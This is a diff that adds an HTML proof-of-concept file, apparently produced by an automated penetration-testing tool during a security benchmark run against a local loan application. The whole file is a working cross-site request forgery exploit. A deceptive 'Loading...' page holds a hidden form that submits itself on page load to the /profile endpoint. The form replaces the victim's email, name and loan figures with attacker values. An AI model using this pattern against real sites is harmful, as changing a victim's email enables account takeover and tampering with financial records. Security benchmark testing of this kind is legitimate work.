@@ -1,0 +1,40 @@
+<!-- 
+POC: CSRF attack on /profile endpoint - Modifies authenticated user's profile data by submitting a hidden form from attacker-controlled domain
+Target: ./repo
+Created: 2025-12-02T16:23:51.517Z
+Session: benchmark-XBEN-104-24-mioryccy
+
+To test this POC:
+1. Open this file in a web browser: file:///home/daytona/.pensar/executions/benchmark-XBEN-104-24-mioryccy/pocs/poc_csrf_profile_endpoint.html
+2. Or serve it and navigate to the target application
+3. Observe the vulnerability demonstration (e.g., XSS alert, CSRF execution)
+-->
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Innocent Looking Page</title>
+</head>
+<body>
+    <h1>Loading...</h1>
+    <p>This page is loading important content. Please wait...</p>
+    
+    <!-- Hidden CSRF form targeting /profile endpoint -->
+    <form id="csrf_form" action="http://localhost:8080/profile" method="POST" style="display:none;">
+        <input type="hidden" name="email" value="attacker@hacked.com">
+        <input type="hidden" name="name" value="HACKED">
+        <input type="hidden" name="lastname" value="USER">
+        <input type="hidden" name="loan_amount" value="99999">
+        <input type="hidden" name="loan_term_months" value="1">
+        <input type="hidden" name="monthly_payment" value="99999">
+    </form>
+    
+    <script>
+        // Automatically submit the form when page loads
+        // This exploits the fact that the /profile endpoint doesn't validate CSRF tokens
+        window.onload = function() {
+            document.getElementById('csrf_form').submit();
+        };
+    </script>
+</body>
+</html>
